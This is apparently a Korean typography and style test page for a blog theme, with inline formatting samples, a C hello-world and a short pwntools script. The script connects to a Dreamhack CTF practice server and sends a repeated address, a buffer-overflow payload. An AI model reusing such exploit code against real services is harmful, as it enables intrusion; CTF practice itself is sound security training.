1) 본문 텍스트 & 인라인 스타일
#

일반 본문입니다. 볼드, 이탤릭, 스트라이크, 형광펜(mark), 밑줄, 아래첨자와 위첨자.

  • 링크: 기본 링크 / 호버링 / 방문 후
  • 코드 인라인: `backticks`, 123, #3123, --flag=value
  • 키보드 입력: CTRL + K
  • 작은 글씨: Small text
#include <stdio.h>

int main(int argc, char** argv)
{
    printf("Hello, world!\n");

    return 0;
}

from pwn import *

p = remote("host4.dreamhack.games", 10159)

p.recvline()
p.send(p64(0x40069C) * 30)

p.interactive()
